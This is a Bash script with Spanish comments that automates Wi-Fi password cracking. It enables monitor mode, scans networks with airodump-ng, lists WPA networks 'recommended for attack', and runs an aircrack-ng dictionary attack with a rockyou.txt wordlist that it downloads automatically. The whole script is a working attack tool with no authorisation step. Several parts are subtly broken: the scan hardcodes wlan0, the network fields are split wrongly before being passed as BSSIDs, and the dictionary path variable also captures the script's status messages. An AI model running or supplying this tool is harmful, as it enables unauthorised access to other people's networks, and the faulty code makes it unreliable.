#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Nombre del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="/root/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"

# Dependencias necesarias
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip")

# Función: Limpiar pantalla con scroll visible
clear_screen() {
    clear
    echo -e "${BLUE}-------------------------------------------------------------${NC}"
}

# Verificar permisos de administrador
check_permissions() {
    if [[ $EUID -ne 0 ]]; then
        clear_screen
        echo -e "${RED}[-] Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
        exit 1
    fi
}

# Crear carpeta del proyecto y de resultados
prepare_project_directory() {
    clear_screen
    echo -e "${BLUE}[+] Verificando carpeta del proyecto en $DOWNLOADS_DIR...${NC}"
    if [[ ! -d "$PROJECT_DIR" ]]; then
        echo -e "${YELLOW}[!] La carpeta del proyecto no existe. Creándola...${NC}"
        mkdir -p "$PROJECT_DIR" || { echo -e "${RED}[-] Error al crear la carpeta del proyecto.${NC}"; exit 1; }
        chmod 755 "$PROJECT_DIR"
        echo -e "${GREEN}[+] Carpeta creada: $PROJECT_DIR${NC}"
    else
        echo -e "${GREEN}[+] La carpeta del proyecto ya existe: $PROJECT_DIR${NC}"
    fi

    if [[ ! -d "$RESULTS_DIR" ]]; then
        echo -e "${YELLOW}[!] La carpeta de resultados no existe. Creándola...${NC}"
        mkdir -p "$RESULTS_DIR" || { echo -e "${RED}[-] Error al crear la carpeta de resultados.${NC}"; exit 1; }
        chmod 755 "$RESULTS_DIR"
        echo -e "${GREEN}[+] Carpeta creada: $RESULTS_DIR${NC}"
    else
        echo -e "${GREEN}[+] La carpeta de resultados ya existe: $RESULTS_DIR${NC}"
    fi
}

# Verificar e instalar dependencias
install_dependencies() {
    clear_screen
    echo -e "${BLUE}[+] Verificando dependencias necesarias...${NC}"
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            echo -e "${RED}[-] Dependencia '$dep' no encontrada. Instalando...${NC}"
            apt-get install -y $dep || { echo -e "${RED}[-] Error al instalar '$dep'.${NC}"; exit 1; }
        else
            echo -e "${GREEN}[+] '$dep' ya está instalado.${NC}"
        fi
    done
    sleep 2
}

# Gestión del modo monitor
enable_monitor_mode() {
    clear_screen
    echo -e "${BLUE}[+] Detectando interfaces inalámbricas...${NC}"
    interfaces=$(iw dev | grep Interface | awk '{print $2}')

    if [[ -z "$interfaces" ]]; then
        echo -e "${RED}[-] No se encontraron tarjetas inalámbricas.${NC}"
        sleep 2
        return
    fi

    echo -e "${BLUE}[+] Interfaces detectadas:${NC}"
    for iface in $interfaces; do
        echo -e "  - ${iface}"
    done

    echo -e "${BLUE}[?] ¿Habilitar modo monitor en alguna tarjeta? (y/n)${NC}"
    read -p "Respuesta: " response
    if [[ "$response" == "y" ]]; then
        echo -e "${BLUE}[+] Selecciona una tarjeta:${NC}"
        select iface in $interfaces; do
            if [[ -n "$iface" ]]; then
                echo -e "${BLUE}[+] Habilitando modo monitor en ${iface}...${NC}"
                airmon-ng start $iface || iw dev $iface set type monitor
                echo -e "${GREEN}[+] ${iface} ahora está en modo monitor.${NC}"
                break
            else
                echo -e "${RED}[-] Selección inválida.${NC}"
            fi
        done
    else
        echo -e "${RED}[-] Operación cancelada.${NC}"
    fi
    sleep 2
}

# Escaneo de redes
scan_networks() {
    clear_screen
    echo -e "${BLUE}[+] Iniciando escaneo de redes WiFi durante 60 segundos...${NC}"
    xterm -hold -e "airodump-ng wlan0 --output-format cap --write $RESULTS_DIR/scan_results" &
    sleep 60
    killall airodump-ng
    echo -e "${GREEN}[+] Escaneo completado. Resultados guardados en $RESULTS_DIR.${NC}"
    sleep 2
}

# Analizar archivo .cap y recomendar redes
analyze_cap_file() {
    clear_screen
    echo -e "${BLUE}[+] Analizando archivo .cap para recomendar redes...${NC}"
    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" 2>/dev/null | head -n 1)

    if [[ -z "$cap_file" ]]; then
        echo -e "${RED}[-] No se encontró ningún archivo .cap en la carpeta de resultados.${NC}"
        return
    fi

    echo -e "${GREEN}[+] Archivo .cap encontrado: $cap_file${NC}"
    recommended_networks=$(aircrack-ng $cap_file | grep "WPA" | awk '{print $3, $4, $5}')

    if [[ -z "$recommended_networks" ]]; then
        echo -e "${RED}[-] No se encontraron redes vulnerables en el archivo .cap.${NC}"
        return
    fi

    echo -e "${BLUE}[+] Redes recomendadas para ataque:${NC}"
    select network in $recommended_networks "Salir"; do
        if [[ "$network" == "Salir" ]]; then
            echo -e "${RED}[-] Saliendo del análisis.${NC}"
            return
        elif [[ -n "$network" ]]; then
            echo -e "${GREEN}[+] Red seleccionada para ataque: $network${NC}"
            perform_attack $network
            break
        else
            echo -e "${RED}[-] Selección inválida. Inténtalo nuevamente.${NC}"
        fi
    done
}

# Realizar ataque contra red seleccionada
perform_attack() {
    local network=$1
    dictionary=$(find_rockyou_dictionary)

    echo -e "${BLUE}[+] Ejecutando ataque contra la red: $network${NC}"
    xterm -hold -e "aircrack-ng -w $dictionary -b $network $RESULTS_DIR/scan_results*.cap" &
    sleep 2
}

# Buscar diccionario rockyou.txt en todo el sistema
find_rockyou_dictionary() {
    clear_screen
    echo -e "${BLUE}[+] Buscando diccionario 'rockyou.txt' en el sistema...${NC}"
    dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)

    if [[ -z "$dictionary_path" ]]; then
        echo -e "${YELLOW}[!] Diccionario 'rockyou.txt' no encontrado. Descargando automáticamente...${NC}"
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
        echo -e "${GREEN}[+] Diccionario descargado y descomprimido en $dictionary_path${NC}"
    else
        echo -e "${GREEN}[+] Diccionario encontrado en: $dictionary_path${NC}"
    fi

    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        clear_screen
        echo -e "${BLUE}[=]==================== Menú Principal ====================[=]${NC}"
        echo -e "${GREEN}1.${NC} Verificar e instalar dependencias"
        echo -e "${GREEN}2.${NC} Habilitar modo monitor"
        echo -e "${GREEN}3.${NC} Escanear redes"
        echo -e "${GREEN}4.${NC} Analizar archivo .cap y realizar ataque"
        echo -e "${GREEN}5.${NC} Salir"
        echo -e "${BLUE}[=]=====================================================[=]${NC}"
        read -p "Selecciona una opción: " option

        case $option in
            1) install_dependencies ;;
            2) enable_monitor_mode ;;
            3) scan_networks ;;
            4) analyze_cap_file ;;
            5) echo -e "${RED}[-] Saliendo...${NC}"; exit 0 ;;
            *) echo -e "${RED}[-] Opción no válida.${NC}"; sleep 2 ;;
        esac
    done
}

# Inicio del script
check_permissions
prepare_project_directory
main_menu
